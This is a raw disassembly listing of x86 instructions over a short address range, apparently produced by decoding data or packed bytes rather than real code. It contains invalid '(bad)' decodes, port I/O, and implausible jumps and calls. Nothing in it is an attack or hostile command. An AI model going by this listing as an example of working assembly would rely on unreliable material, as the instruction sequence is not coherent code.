  41563e:	or     BYTE PTR [eax],ah
  415640:	mov    eax,ds:0x2103028c
  415645:	inc    ecx
  415646:	add    al,BYTE PTR [eax+eiz*2+0x10014c0]
  41564d:	or     al,0x21
  41564f:	sub    DWORD PTR [eax],ecx
  415651:	add    DWORD PTR [eax+eax*1],0x80358098
  415658:	cmp    al,0x4
  41565a:	add    al,0x8
  41565c:	add    DWORD PTR [eax],eax
  41565e:	inc    eax
  41565f:	sub    edx,DWORD PTR es:[edx]
  415662:	jb     0x4156b2
  415664:	add    dh,BYTE PTR [eax]
  415666:	adc    al,0x2a
  415668:	aam    0x14
  41566a:	inc    esi
  41566b:	adc    BYTE PTR [eax],dl
  41566d:	add    eax,DWORD PTR [edx]
  41566f:	inc    ebx
  415670:	mov    ds:0x9854800,al
  415675:	mov    dh,0x54
  415677:	inc    eax
  415678:	inc    esp
  415679:	test   al,0x19
  41567b:	add    bl,BYTE PTR [edx]
  41567d:	bound  ecx,QWORD PTR [ecx]
  41567f:	test   BYTE PTR [edx+0x1010],al
  415685:	in     eax,0x1
  415687:	inc    ebx
  415688:	add    BYTE PTR [eax+0x63],dl
  41568b:	inc    ecx
  41568c:	inc    eax
  41568d:	inc    ecx
  41568e:	add    DWORD PTR [ebp+0x15],eax
  415691:	inc    edx
  415692:	add    BYTE PTR [eax+0x8000104],cl
  415698:	pop    eax
  415699:	and    DWORD PTR [ecx],esp
  41569b:	and    BYTE PTR [eax+0x30812],al
  4156a1:	and    BYTE PTR [edx],al
  4156a3:	add    al,0x2
  4156a5:	pusha  
  4156a6:	add    BYTE PTR [eax],ah
  4156a8:	les    ebp,FWORD PTR [edx-0xf96cb7f]
  4156ae:	mov    fs,WORD PTR [ebp+0x2f410342]
  4156b4:	add    BYTE PTR [ebp-0x80],cl
  4156b7:	sub    BYTE PTR [edx],dl
  4156b9:	add    BYTE PTR [ecx+0x0],al
  4156bc:	mov    BYTE PTR [ecx],al
  4156be:	test   eax,0x20204b
  4156c3:	add    BYTE PTR [ebx+0x45482ca],al
  4156c9:	pop    edx
  4156ca:	sub    al,0x0
  4156cc:	and    BYTE PTR [eax+esi*4],cl
  4156cf:	popa   
  4156d0:	adc    BYTE PTR [eax],al
  4156d2:	test   BYTE PTR [ecx],al
  4156d4:	push   eax
  4156d5:	inc    ecx
  4156d6:	add    BYTE PTR [ecx+0x40402004],dl
  4156dc:	mov    ds:0x32805050,al
  4156e1:	add    BYTE PTR [eax],al
  4156e3:	or     dl,BYTE PTR [eax]
  4156e5:	add    BYTE PTR [eax],cl
  4156e7:	add    eax,0x24100
  4156ec:	push   eax
  4156ed:	add    al,0x8
  4156ef:	js     0x4156f1
  4156f1:	push   ecx
  4156f2:	dec    edx
  4156f3:	inc    eax
  4156f4:	add    BYTE PTR [eax+0x0],ah
  4156f7:	or     BYTE PTR [eax+0x40],al
  4156fa:	add    DWORD PTR [eax+0x42910002],ecx
  415700:	or     eax,0x791900c1
  415705:	add    BYTE PTR [eax],al
  415707:	and    BYTE PTR [ebx],al
  415709:	or     al,0x40
  41570b:	push   edx
  41570c:	add    eax,DWORD PTR [ebp+0x0]
  41570f:	add    BYTE PTR [ebx+0x210540c],dl
  415715:	pusha  
  415716:	and    BYTE PTR [ecx+0x10],al
  415719:	add    BYTE PTR [eax+eax*4+0x4],0x4
  41571e:	test   BYTE PTR [eax-0x4dfff5f8],al
  415724:	sub    BYTE PTR [ecx+0x58],dl
  41572a:	push   cs
  41572b:	xchg   BYTE PTR [ecx],dl
  41572d:	pop    edx
  41572e:	add    DWORD PTR [eax],eax
  415730:	and    BYTE PTR [eax+0xa692063],al
  415736:	xchg   ebp,eax
  415737:	test   BYTE PTR [edx+0x1],al
  41573a:	add    BYTE PTR [eax+eax*1],al
  41573d:	inc    esi
  41573e:	or     BYTE PTR [ecx],al
  415740:	add    al,0x10
  415742:	adc    BYTE PTR [edx-0x5ffefebe],0x0
  415749:	xor    ah,ah
  41574b:	xor    BYTE PTR [edi-0x6bf7fdc0],dl
  415751:	or     BYTE PTR [eax],ah
  415753:	dec    edx
  415754:	and    BYTE PTR [ecx],ah
  415756:	and    al,0xd0
  415758:	add    al,cl
  41575a:	inc    eax
  41575b:	adc    BYTE PTR ds:0x4049c0,al
  415761:	add    BYTE PTR [eax],ch
  415763:	add    BYTE PTR [eax+eax*4+0x24],dh
  415767:	inc    ecx
  415768:	add    BYTE PTR [esi],dl
  41576a:	inc    eax
  41576b:	and    BYTE PTR [ecx+0x4082040],al
  415771:	adc    BYTE PTR [eax],ah
  415773:	add    cl,BYTE PTR [eax]
  415775:	mov    al,ds:0x3040010
  41577a:	add    BYTE PTR [eax],ah
  41577c:	pop    ecx
  41577d:	and    DWORD PTR [eax],eax
  41577f:	push   cs
  415780:	mov    al,ds:0x8a04100
  415785:	add    BYTE PTR [ecx+ecx*1],bl
  415788:	add    BYTE PTR [eax+0x2b020400],dl
  41578e:	push   es
  41578f:	and    BYTE PTR [edx+eax*8],al
  415792:	add    DWORD PTR [eax],eax
  415794:	add    BYTE PTR [edx+0xc402000],cl
  41579a:	add    BYTE PTR [edx],al
  41579c:	add    DWORD PTR [eax],0x28047280
  4157a2:	add    BYTE PTR [eax+0x821801],dl
  4157a8:	imul   ecx,DWORD PTR [eax],0x20038000
  4157ae:	add    cl,ah
  4157b0:	add    BYTE PTR [eax],dl
  4157b2:	add    al,0x2
  4157b4:	sbb    BYTE PTR [ecx+0x20111902],al
  4157ba:	add    BYTE PTR [esp+esi*8-0x72],bh
  4157be:	pop    es
  4157bf:	add    BYTE PTR [ecx],dh
  4157c1:	add    BYTE PTR [eax+0x0],0x80
  4157c5:	inc    eax
  4157c6:	add    cl,BYTE PTR [eax]
  4157c8:	adc    al,0x0
  4157ca:	dec    eax
  4157cb:	dec    eax
  4157cc:	add    BYTE PTR [eax+0x8007],al
  4157d2:	xchg   edx,eax
  4157d3:	inc    edx
  4157d4:	test   BYTE PTR [eax],al
  4157d6:	add    al,0xc2
  4157d8:	add    al,0x41
  4157da:	add    al,BYTE PTR [eax]
  4157dc:	push   esp
  4157dd:	add    BYTE PTR [eax],al
  4157df:	inc    eax
  4157e0:	adc    BYTE PTR [eax+0x20081804],cl
  4157e6:	add    BYTE PTR [eax+0x8],al
  4157e9:	add    BYTE PTR [eax],dl
  4157eb:	xchg   BYTE PTR [eax+0x2],bh
  4157ee:	or     al,0x18
  4157f0:	add    al,BYTE PTR ds:0x602008
  4157f6:	add    BYTE PTR ds:0x28000410,ah
  4157fc:	add    BYTE PTR [eax],al
  4157fe:	add    BYTE PTR [edx],al
  415800:	xor    BYTE PTR [eax],al
  415802:	and    eax,DWORD PTR [eax]
  415804:	nop
  415805:	add    BYTE PTR [eax],ah
  415807:	enter  0x3,0x0
  41580b:	add    BYTE PTR [ecx],al
  41580d:	popa   
  41580e:	add    BYTE PTR [ecx+0x49],al
  415811:	and    BYTE PTR [eax],0x4
  415814:	inc    edx
  415815:	cmp    dl,BYTE PTR [ebx+eax*1-0x76ee9efc]
  41581c:	add    BYTE PTR [eax+ecx*4],cl
  41581f:	add    BYTE PTR [edx],ah
  415821:	or     BYTE PTR [eax],al
  415823:	or     DWORD PTR ds:0x10090467,eax
  415829:	or     BYTE PTR [ecx-0x49ffd7bf],dl
  41582f:	(bad)  
  415830:	loopne 0x415842
  415832:	sbb    BYTE PTR [ecx+0x22],al
  415835:	sub    BYTE PTR [ecx],al
  415837:	xchg   DWORD PTR [eax],esp
  415839:	inc    eax
  41583a:	add    BYTE PTR [eax],cl
  41583c:	imul   eax,DWORD PTR [eax],0x80c08548
  415842:	adc    al,0x63
  415844:	dec    edx
  415845:	mov    al,BYTE PTR [ebx+0x10]
  415848:	push   eax
  415849:	add    cl,cl
  41584b:	sub    BYTE PTR [ecx+0x0],dl
  41584e:	add    BYTE PTR [eax],cl
  415850:	inc    eax
  415851:	and    cl,BYTE PTR [eax]
  415853:	pop    es
  415854:	or     BYTE PTR [eax],al
  415856:	inc    edx
  415857:	inc    eax
  415858:	add    BYTE PTR [eax],al
  41585a:	or     DWORD PTR [eax+ecx*1],eax
  41585d:	and    BYTE PTR [eax],0x41
  415860:	inc    ecx
  415861:	xchg   ebp,eax
  415862:	mov    eax,0xa001112
  415867:	or     BYTE PTR [eax+0x8],0x4a
  41586b:	add    BYTE PTR ds:0x86451010,cl
  415871:	or     BYTE PTR [eax],0xa1
  415874:	add    DWORD PTR [ecx],esp
  415876:	and    BYTE PTR [ecx+0x51083900],al
  41587c:	xor    BYTE PTR ds:0xb0013a00,al
  415882:	add    DWORD PTR [eax],esp
  415884:	add    al,BYTE PTR [edx]
  415886:	add    DWORD PTR [ebp-0x80],esp
  415889:	add    BYTE PTR [eax+ebp*8],dl
  41588c:	cmp    BYTE PTR [edx],al
  41588e:	add    BYTE PTR [eax],cl
  415890:	add    al,BYTE PTR [eax]
  415892:	and    BYTE PTR [eax+0x4],al
  415895:	arpl   WORD PTR [ecx-0x74efef0],ax
  41589b:	xor    BYTE PTR [eax],al
  41589d:	and    BYTE PTR [esi],al
  41589f:	add    BYTE PTR [ecx],ah
  4158a1:	and    BYTE PTR [eax],al
  4158a3:	and    al,BYTE PTR [eax]
  4158a5:	adc    al,BYTE PTR [eax+0x425080]
  4158ab:	add    al,0x48
  4158ad:	add    BYTE PTR [ecx],al
  4158af:	jo     0x4158b6
  4158b1:	add    al,BYTE PTR [eax]
  4158b3:	add    al,BYTE PTR [eax+eiz*4+0x61005c43]
  4158ba:	inc    ebp
  4158bb:	mov    BYTE PTR [ecx+0x8],cl
  4158be:	add    BYTE PTR [eax],ah
  4158c0:	add    ecx,edx
  4158c2:	mov    DWORD PTR [eax],esp
  4158c4:	adc    BYTE PTR [edx-0x3e],al
  4158c7:	add    BYTE PTR [eax+0x4302080],cl
  4158cd:	and    BYTE PTR [eax+edx*1],al
  4158d0:	add    al,0x26
  4158d2:	sub    BYTE PTR [ecx],ah
  4158d4:	adc    cl,BYTE PTR [eax+ebp*1]
  4158d7:	add    BYTE PTR [esp+esi*1],al
  4158da:	push   es
  4158db:	les    ecx,FWORD PTR [eax]
  4158dd:	add    BYTE PTR [eax+0x4b],ah
  4158e0:	stos   BYTE PTR es:[edi],al
  4158e1:	nop
  4158e2:	add    DWORD PTR [ecx+0x6],ecx
  4158e5:	add    BYTE PTR [ecx+0x0],ah
  4158e8:	add    BYTE PTR [edx],0x10
  4158eb:	mov    al,0xa4
  4158ed:	add    al,0x0
  4158ef:	add    al,0x44
  4158f1:	add    BYTE PTR [ecx+0x8000100],ah
  4158f7:	or     DWORD PTR [eax+0x2828],ebx
  4158fd:	xchg   ebp,eax
  4158fe:	or     BYTE PTR [eax+eax*1],0x41
  415902:	add    BYTE PTR [eax+eax*2+0x2883251],al
  415909:	or     al,0x8
  41590b:	cwde   
  41590c:	add    BYTE PTR [eax+eax*1+0x810440],al
  415913:	or     al,BYTE PTR [edx]
  415915:	and    al,0x30
  415917:	lock adc al,BYTE PTR [edx+0x4]
  41591b:	inc    eax
  41591c:	test   DWORD PTR [eax],esp
  41591e:	and    DWORD PTR [eax],eax
  415920:	adc    ah,BYTE PTR [eax+0x52]
  415923:	adc    dl,bl
  415925:	push   ebx
  415926:	mov    BYTE PTR [edx],al
  415928:	sbb    BYTE PTR [eax+ecx*1+0x14110c4],dl
  41592f:	add    DWORD PTR [eax+0x0],esp
  415932:	test   DWORD PTR [eax],edx
  415934:	mov    cl,BYTE PTR [eax]
  415936:	or     BYTE PTR [edx],dl
  415938:	add    al,0x80
  41593a:	add    BYTE PTR [edx],dl
  41593c:	add    BYTE PTR [edx],0x0
  41593f:	and    BYTE PTR [eax],al
  415941:	test   al,0x41
  415943:	add    DWORD PTR [eax],0x81090006
  415949:	add    DWORD PTR [ecx+0x14],0x5d0111b0
  415950:	push   es
  415951:	mov    WORD PTR [eax],cs
  415953:	add    BYTE PTR [eax],al
  415955:	add    DWORD PTR [eax+0x0],eax
  415958:	sbb    BYTE PTR [ecx+0x2],dl
  41595b:	mov    ss,WORD PTR [eax]
  41595d:	add    BYTE PTR gs:[eax],al
  415960:	add    BYTE PTR [eax],al
  415962:	adc    BYTE PTR [eax],al
  415964:	add    BYTE PTR ds:0x300154,cl
  41596a:	and    ah,BYTE PTR [ecx]
  41596c:	add    al,0x2
  41596e:	pop    ss
  41596f:	add    eax,0x820408
  415974:	inc    ecx
  415975:	cmp    BYTE PTR [ecx],cl
  415977:	add    al,0x41
  415979:	inc    edx
  41597a:	push   cs
  41597b:	adc    DWORD PTR [eax+0x0],edx
  41597e:	add    BYTE PTR [ecx],al
  415980:	add    BYTE PTR [edx+0x40],0xc8
  415984:	enter  0x2865,0x25
  415988:	bound  eax,QWORD PTR [eax-0x80]
  41598b:	adc    BYTE PTR [edx+esi*1+0xbc802ca],al
  415992:	add    DWORD PTR [eax+ecx*1],eax
  415995:	nop
  415996:	add    BYTE PTR [eax],0x2
  415999:	add    al,ah
  41599b:	xchg   edx,eax
  41599c:	adc    eax,0x211080
  4159a1:	cmp    al,BYTE PTR [eax]
  4159a3:	add    BYTE PTR [eax],cl
  4159a5:	cwde   
  4159a6:	push   0x4d440280
  4159ab:	xor    eax,0x10168863
  4159b0:	mov    BYTE PTR [eax],al
  4159b2:	sbb    BYTE PTR [eax+eax*1],0x94
  4159b6:	inc    ecx
  4159b7:	fs inc eax
  4159b9:	add    BYTE PTR [eax],al
  4159bb:	or     BYTE PTR [edx+0x4ccc],al
  4159c1:	inc    eax
  4159c2:	xchg   BYTE PTR [eax+eax*1],ch
  4159c5:	add    BYTE PTR [esi],al
  4159c7:	and    BYTE PTR [ecx],al
  4159c9:	or     esp,eax
  4159cb:	push   eax
  4159cc:	push   edx
  4159cd:	add    BYTE PTR [eax],al
  4159cf:	and    al,BYTE PTR [ecx]
  4159d1:	add    DWORD PTR [edx],edx
  4159d3:	xor    al,dl
  4159d5:	add    BYTE PTR [eax],al
  4159d7:	add    BYTE PTR [eax],cl
  4159d9:	or     BYTE PTR [ecx+eax*1],al
  4159dc:	or     BYTE PTR [esi+0x4050000],al
  4159e2:	add    DWORD PTR [eax],esp
  4159e4:	pop    es
  4159e5:	pusha  
  4159e6:	add    eax,DWORD PTR [eax]
  4159e8:	add    cl,BYTE PTR [eax+eax*2]
  4159eb:	add    al,0xc5
  4159ed:	add    al,0x11
  4159ef:	rol    DWORD PTR [eax+0x2],0x41
  4159f3:	push   cs
  4159f4:	add    BYTE PTR [ebp+0x2a010000],al
  4159fa:	add    al,0x51
  4159fc:	and    BYTE PTR [ecx],ah
  4159fe:	inc    edx
  4159ff:	push   ebx
  415a00:	popa   
  415a01:	add    BYTE PTR [ebx+0x8],al
  415a04:	cwde   
  415a05:	add    BYTE PTR [eax],cl
  415a07:	inc    ebx
  415a08:	rcl    BYTE PTR [ebx+0x18010004],0x80
  415a0f:	adc    BYTE PTR [edx+0x24000000],bl
  415a15:	or     dl,al
  415a17:	inc    eax
  415a18:	adc    BYTE PTR [eax+0x40],cl
  415a1b:	add    DWORD PTR [eax+eax*2],eax
  415a1e:	adc    DWORD PTR [eax],eax
  415a20:	add    BYTE PTR [ecx],bl
  415a22:	add    eax,DWORD PTR [eax]
  415a24:	add    BYTE PTR [eax+eax*4],dl
  415a27:	adc    ch,BYTE PTR [eax+0x4a04108]
  415a2d:	inc    eax
  415a2e:	adc    DWORD PTR [ecx],ebx
  415a30:	call   0x80425a5a
  415a35:	inc    eax
  415a36:	add    DWORD PTR [edx],0x1814085
  415a3c:	mov    WORD PTR [ebx-0x3f7ffc0],fs
  415a42:	add    al,BYTE PTR [eax+eax*4]
  415a45:	inc    ecx
  415a46:	or     eax,DWORD PTR [ebp+0x10]
  415a49:	or     DWORD PTR [ecx],ecx
  415a4b:	add    BYTE PTR [ecx+eax*2+0x6],dl
  415a4f:	adc    BYTE PTR [eax],ah
  415a51:	add    dl,al
  415a53:	test   BYTE PTR [ebx],dl
  415a55:	rol    BYTE PTR [eax+0x4a4bc060],0x1
  415a5c:	add    BYTE PTR [eax],al
  415a5e:	sar    BYTE PTR [eax+0x10],0x0
  415a62:	leave  
  415a63:	and    al,BYTE PTR [eax+0x0]
  415a66:	ror    BYTE PTR [eax],0x0
  415a69:	add    BYTE PTR [eax],bh
  415a6b:	add    cl,al
  415a6d:	add    BYTE PTR [eax+0x41],al
  415a70:	and    al,0xe
  415a72:	rol    BYTE PTR [ebp+0x33141000],0x3
  415a79:	mov    al,ds:0xa6068
  415a7e:	and    BYTE PTR [ecx],al
  415a80:	add    BYTE PTR [eax+eax*1+0x1090c118],dl
  415a87:	add    BYTE PTR [ecx],al
  415a89:	bound  ebp,QWORD PTR [eax]
  415a8b:	or     al,0x39
  415a8d:	nop
  415a8e:	and    BYTE PTR [edx],al
  415a90:	or     BYTE PTR [eax],al
  415a92:	and    al,ah
  415a94:	add    BYTE PTR [ecx+0x8],ch
  415a97:	sbb    al,0x14
  415a99:	adc    BYTE PTR [eax+0x8],al
  415a9c:	push   eax
  415a9d:	ror    BYTE PTR [eax],0x1e
  415aa0:	stos   BYTE PTR es:[edi],al
  415aa1:	and    BYTE PTR [eax+0x10],dl
  415aa4:	add    BYTE PTR [eax+0x18068],al
  415aaa:	add    al,0x0
  415aac:	dec    eax
  415aad:	add    BYTE PTR [ecx-0x7aff5f00],dl
  415ab3:	sub    BYTE PTR [edx+0x68],al
  415ab6:	and    BYTE PTR [eax],al
  415ab8:	add    BYTE PTR [esi+eiz*1],0x0
  415abc:	loopne 0x415abe
  415abe:	inc    edx
  415abf:	popa   
  415ac0:	add    BYTE PTR [ecx],al
  415ac2:	loopne 0x415aec
  415ac4:	add    BYTE PTR [eax+0x7],ah
  415ac7:	sub    cl,BYTE PTR [eax]
  415ac9:	inc    edx
  415aca:	or     al,0x8c
  415acc:	add    BYTE PTR [eax+0x28],al
  415acf:	adc    DWORD PTR [edx],0x80dd04
  415ad5:	or     BYTE PTR [eax],al
  415ad7:	adc    DWORD PTR [eax],eax
  415ad9:	add    BYTE PTR [ecx],al
  415adb:	and    al,0x0
  415add:	inc    edx
  415ade:	inc    ecx
  415adf:	add    BYTE PTR [edx],0x0
  415ae2:	or     BYTE PTR [eax],ah
  415ae4:	sub    BYTE PTR [esi+0x30],al
  415ae7:	add    al,al
  415ae9:	dec    edx
  415aea:	add    DWORD PTR [ecx],0x40a0a801
  415af0:	push   cs
  415af1:	and    BYTE PTR [eax],al
  415af3:	adc    al,BYTE PTR [eax+0x2208c102]
  415af9:	xchg   ecx,eax
  415afa:	cdq    
  415afb:	add    al,0x2
  415afd:	add    dl,BYTE PTR [eax]
  415aff:	jmp    0x23437b0c
  415b04:	add    BYTE PTR [edx+0xe],al
  415b07:	or     al,0x0
  415b09:	or     cl,BYTE PTR [eax]
  415b0b:	ret    0x8040
  415b0e:	add    BYTE PTR [eax],al
  415b10:	add    BYTE PTR [eax+0x0],dl
  415b13:	add    dl,BYTE PTR [eax+0x3]
  415b16:	inc    edi
  415b17:	add    eax,0x20b800c
  415b1c:	push   0x41144020
  415b21:	or     bl,dl
  415b23:	add    DWORD PTR [eax],0x4
  415b26:	add    BYTE PTR [eax],al
  415b28:	and    BYTE PTR [eax],al
  415b2a:	add    al,0x9
  415b2c:	and    DWORD PTR [edx+0x986172],ecx
  415b32:	or     BYTE PTR [eax],ah
  415b34:	and    BYTE PTR [eax],al
  415b36:	adc    al,0x26
  415b38:	and    ah,BYTE PTR [ecx+0x1021c2]
  415b3e:	add    eax,0x81200401
  415b43:	adc    BYTE PTR [esp+edx*1],al
  415b46:	adc    DWORD PTR [eax],ebx
  415b48:	dec    eax
  415b49:	add    BYTE PTR [eax+0x2],dh
  415b4f:	add    al,0x0
  415b51:	popa   
  415b52:	test   BYTE PTR [edx+0x40304400],dl
  415b58:	loopne 0x415b5c
  415b5a:	push   ecx
  415b5b:	add    al,0x6b
  415b5d:	or     BYTE PTR [eax+0x9080000],al
  415b63:	add    BYTE PTR [eax],al
  415b65:	and    al,BYTE PTR [eax+0x69800000]
  415b6b:	and    BYTE PTR [eax+0x40000029],0x0
  415b72:	adc    BYTE PTR [eax],al
  415b74:	inc    eax
  415b75:	add    al,ch
  415b77:	adc    BYTE PTR [eax],al
  415b79:	and    BYTE PTR [eax],dl
  415b7b:	add    eax,DWORD PTR [eax]
  415b7d:	and    BYTE PTR [eax],al
  415b7f:	add    BYTE PTR [eax],al
  415b81:	and    al,0x80
  415b83:	add    BYTE PTR [ecx+0x0],al
  415b86:	inc    ecx
  415b87:	xchg   edx,eax
  415b88:	nop
  415b89:	ins    BYTE PTR es:[edi],dx
  415b8a:	adc    BYTE PTR [eax+0x54d40000],0x34
  415b91:	and    BYTE PTR [eax],0x4
  415b94:	push   es
  415b95:	push   es
  415b96:	add    BYTE PTR [ecx+0x21000045],al
  415b9c:	inc    eax
  415b9d:	add    BYTE PTR [eax],al
  415b9f:	imul   eax,DWORD PTR [eax],0x86800003
  415ba5:	add    al,0x88
  415ba7:	and    al,BYTE PTR [esi]
  415ba9:	add    al,0x1
  415bab:	add    cl,al
  415bad:	add    BYTE PTR [eax],al
  415baf:	add    DWORD PTR [eax],eax
  415bb1:	add    BYTE PTR [eax],cl
  415bb3:	sub    DWORD PTR [eax-0x3f],esp
  415bb6:	enter  0x0,0x9
  415bba:	and    BYTE PTR [eax],ah
  415bbc:	adc    al,0x46
  415bbe:	add    BYTE PTR [eax],cl
  415bc0:	or     esp,eax
  415bc2:	inc    eax
  415bc3:	or     al,0xc0
  415bc5:	int    0x20
  415bc7:	add    BYTE PTR [ecx],al
  415bc9:	and    BYTE PTR [eax+0x2ac10008],dl
  415bcf:	inc    eax
  415bd0:	and    BYTE PTR [eax],al
  415bd2:	rol    al,0xa2
  415bd5:	add    BYTE PTR [eax],al
  415bd7:	inc    eax
  415bd8:	add    BYTE PTR [edx+eax*1],bl
  415bdb:	add    BYTE PTR [eax],cl
  415bdd:	rol    BYTE PTR [edx],1
  415bdf:	add    BYTE PTR [eax+eax*1-0x7fdfb800],al
  415be6:	adc    BYTE PTR [eax+0x0],al
  415be9:	sub    BYTE PTR [eax],cl
  415beb:	sub    DWORD PTR [eax+0x0],eax
  415bee:	add    BYTE PTR [eax],al
  415bf0:	adc    BYTE PTR [ecx+ebx*2],al
  415bf3:	and    BYTE PTR [eax],bl
  415bf5:	inc    eax
  415bf6:	or     BYTE PTR [eax+eiz*1],dl
  415bf9:	loop   0x415c03
  415bfb:	add    BYTE PTR [ecx+0x18],ah
  415bfe:	mov    BYTE PTR [ecx],cl
  415c00:	add    BYTE PTR [ecx+0x40],ah
  415c03:	add    dl,BYTE PTR [eax+eax*1]
  415c06:	add    eax,0x20124a
  415c0b:	add    BYTE PTR [eax],al
  415c0d:	and    ah,BYTE PTR [edx+0x6a]
  415c10:	add    BYTE PTR [edx],ch
  415c12:	inc    ebp
  415c13:	add    BYTE PTR [eax+0x4012800],al
  415c19:	add    al,0x41
  415c1b:	sub    BYTE PTR [eax],al
  415c1d:	adc    DWORD PTR [eax],0x4bc10030
  415c23:	add    BYTE PTR [eax+0x0],al
  415c26:	adc    DWORD PTR [eax],eax
  415c28:	inc    ecx
  415c29:	rol    BYTE PTR [ecx+0x10000404],0x0
  415c30:	or     BYTE PTR [eax],al
  415c32:	add    BYTE PTR [ecx],dl
  415c34:	dec    eax
  415c35:	or     BYTE PTR [eax],cl
  415c37:	inc    esp
  415c38:	add    cl,BYTE PTR [eax]
  415c3a:	adc    al,0x0
  415c3c:	add    BYTE PTR [eax],al
  415c3e:	or     DWORD PTR [eax+eax*1],eax
  415c41:	add    BYTE PTR [ecx+0x8],al
  415c44:	and    BYTE PTR [eax+0x1],bl
  415c47:	shr    BYTE PTR [edx],0x10
  415c4a:	and    BYTE PTR [eax],al
  415c4c:	push   cs
  415c4d:	inc    ebp
  415c4e:	sub    ecx,DWORD PTR [eax]
  415c50:	add    DWORD PTR [eax+0x40],ecx
  415c53:	in     al,0x2c
  415c55:	add    BYTE PTR [eax+0x16102018],cl
  415c5b:	sbb    al,0xe9
  415c5d:	inc    eax
  415c5e:	mov    BYTE PTR [ecx+0x0],ah
  415c61:	push   es
  415c62:	add    al,0x0
  415c64:	test   eax,0x81410060
  415c69:	inc    esi
  415c6a:	add    BYTE PTR [eax+ebx*4],dl
  415c6d:	add    BYTE PTR [eax],al
  415c6f:	dec    esp
  415c70:	add    DWORD PTR [edx+0x0],ecx
  415c73:	or     BYTE PTR [ecx+0x842080],al
  415c79:	add    DWORD PTR [eax+0x0],0x4182
  415c80:	and    DWORD PTR [edx+0x10568008],edx
  415c86:	adc    al,0x81
  415c88:	add    al,0x80
  415c8a:	add    al,BYTE PTR [ecx+0x0]
  415c8d:	or     BYTE PTR [ecx-0x7d9fd737],0x4
  415c94:	add    BYTE PTR [eax],cl
  415c96:	or     BYTE PTR [eax],al
  415c98:	inc    eax
  415c99:	mov    al,ds:0x204107a
  415c9e:	add    BYTE PTR [eax+0x8800020],bl
  415ca4:	dec    ecx
  415ca5:	adc    BYTE PTR [edx+0x0],al
  415ca8:	sub    al,BYTE PTR [edx+0x13088002]
  415cae:	add    BYTE PTR [edx+eax*1],al
  415cb1:	adc    BYTE PTR [eax],al
  415cb3:	adc    al,BYTE PTR [eax]
  415cb5:	dec    eax
  415cb6:	pop    ecx
  415cb7:	add    BYTE PTR [ecx],cl
  415cb9:	add    BYTE PTR [ecx+0x70046080],al
  415cbf:	add    BYTE PTR [eax],al
  415cc1:	add    BYTE PTR [eax],dl
  415cc3:	add    BYTE PTR [ecx],al
  415cc5:	inc    eax
  415cc6:	add    BYTE PTR [eax],al
  415cc8:	add    BYTE PTR [esi],ah
  415cca:	mov    dl,0x88
  415ccc:	adc    BYTE PTR [eax+eiz*1],al
  415ccf:	add    DWORD PTR [eax],eax
  415cd1:	add    BYTE PTR [ecx+0x30e0000],ch
  415cd7:	and    BYTE PTR [ebx],al
  415cd9:	add    BYTE PTR [eax+0x2560094],al
  415cdf:	adc    BYTE PTR [ecx],al
  415ce1:	dec    eax
  415ce2:	inc    eax
  415ce3:	add    BYTE PTR [eax],al
  415ce5:	xor    BYTE PTR [eax],al
  415ce7:	add    BYTE PTR [eax],0x41
  415cea:	add    BYTE PTR ds:0x408a102,al
  415cf0:	push   ecx
  415cf1:	or     BYTE PTR [eax],ah
  415cf3:	add    BYTE PTR [ecx+eax*4],ah
  415cf6:	add    BYTE PTR [esp+eax*2],0x63
  415cfa:	add    cl,BYTE PTR [ecx]
  415cfc:	adc    eax,0x9080955a
  415d01:	lea    ebx,[esi]
  415d03:	and    ah,BYTE PTR [eax+ecx*1]
  415d06:	sbb    BYTE PTR [eax],0x8
  415d09:	mov    al,ds:0x71401910
  415d0e:	mov    WORD PTR [eax],fs
  415d10:	add    dl,BYTE PTR [eax]
  415d12:	or     al,0x32
  415d14:	add    al,0x61
  415d16:	add    BYTE PTR [ecx+0x40],al
  415d19:	lock or BYTE PTR [edx],0x26
  415d1d:	and    BYTE PTR [edx+0x20],dl
  415d20:	and    dl,BYTE PTR [ebp+0x4]
  415d23:	pop    eax
  415d24:	add    DWORD PTR [ebx],0x6421018
  415d2a:	mov    al,ds:0xc0802020
  415d2f:	test   BYTE PTR [esp+eax*1],cl
  415d32:	inc    ebp
  415d33:	add    eax,DWORD PTR [edx+0x800a088]
  415d39:	adc    BYTE PTR [eax],cl
  415d3b:	cmp    BYTE PTR [edx+eax*2],dl
  415d3e:	add    BYTE PTR [eax],ah
  415d40:	add    al,0x1
  415d42:	add    al,0x41
  415d44:	add    BYTE PTR [eax+0x401b0220],dl
  415d4a:	dec    edx
  415d4b:	sbb    BYTE PTR [ecx+0x20400808],0x20
  415d52:	pop    ss
  415d53:	mov    eax,cs
  415d55:	add    BYTE PTR [eax],0x0
  415d58:	popa   
  415d59:	adc    ecx,DWORD PTR [eax+0x40]
  415d5c:	or     BYTE PTR [eax+0x4b01e100],dh
  415d62:	inc    ecx
  415d63:	inc    edx
  415d64:	add    ah,al
  415d66:	add    BYTE PTR [edx],cl
  415d68:	and    BYTE PTR [eax+0x160000a0],dl
  415d6e:	inc    eax
  415d6f:	inc    eax
  415d70:	inc    edx
  415d71:	sbb    BYTE PTR [eax+esi*2],0x8
  415d75:	add    DWORD PTR [eax],eax
  415d77:	test   eax,0x5
  415d7c:	adc    BYTE PTR [eax],al
  415d7e:	add    al,BYTE PTR [eax]
  415d80:	and    DWORD PTR [ecx-0x6bf3ef60],esp
  415d86:	add    BYTE PTR [edx+0x18414048],al
  415d8c:	rol    DWORD PTR [eax],0x90
  415d8f:	add    BYTE PTR [ebp+0x4005ccc],al
  415d95:	add    DWORD PTR [eax],eax
  415d97:	adc    BYTE PTR [eax+0x21008810],dl
  415d9d:	adc    BYTE PTR [eax+0x4100800],ah
  415da3:	push   ecx
  415da4:	add    al,BYTE PTR [eax]
  415da6:	add    BYTE PTR [eax],al
  415da8:	add    BYTE PTR [ecx-0x6ffeefe0],al
  415dae:	inc    ecx
  415daf:	add    BYTE PTR [ebx],al
  415db1:	and    al,BYTE PTR [ecx]
  415db3:	add    DWORD PTR [ebx+0x42189],eax
  415db9:	in     eax,0x88
  415dbb:	data16 add BYTE PTR [eax],ah
  415dbe:	inc    eax
  415dbf:	nop
  415dc0:	add    BYTE PTR [eax],dl
  415dc2:	push   esp
  415dc3:	inc    ebx
  415dc4:	inc    edx
  415dc5:	mov    al,0x2
  415dc7:	add    dl,BYTE PTR [ecx+ecx*1]
  415dca:	xor    al,BYTE PTR [ecx+0x0]
  415dcd:	mov    BYTE PTR [eax+0x20],dl
  415dd0:	and    BYTE PTR [eax],al
  415dd2:	rcr    BYTE PTR [eax+eax*1],0x8c
  415dd6:	sub    DWORD PTR [eax],eax
  415dd8:	and    BYTE PTR [eax],0x0
